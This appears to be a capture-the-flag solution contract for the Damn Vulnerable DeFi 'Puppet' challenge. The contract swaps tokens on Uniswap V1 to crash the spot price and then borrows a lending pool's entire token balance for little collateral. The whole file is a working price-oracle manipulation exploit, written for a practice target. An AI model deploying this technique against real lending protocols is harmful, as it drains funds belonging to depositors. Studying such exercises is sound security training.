// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";

import {Exchange} from "../../src/compromised/Exchange.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol"; 
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract PuppetExploiter {

    IUniswapV1Exchange public exchange;
    PuppetPool public pool;
    DamnValuableToken public token;
    address public recovery;

    constructor(IUniswapV1Exchange _exchange, PuppetPool _pool, DamnValuableToken _token, address _recovery) payable {
        exchange = _exchange;
        pool = _pool;
        token = _token;
        recovery = _recovery;
    }

    function exploit() external payable {

        token.approve(address(exchange), token.balanceOf(address(this)));
        exchange.tokenToEthSwapInput(
            token.balanceOf(address(this)),
            9 ether,
            block.timestamp + 1
        );  

        pool.borrow{value: address(this).balance}(
            token.balanceOf(address(pool)),
            recovery
        );
    }

    receive () external payable {}
}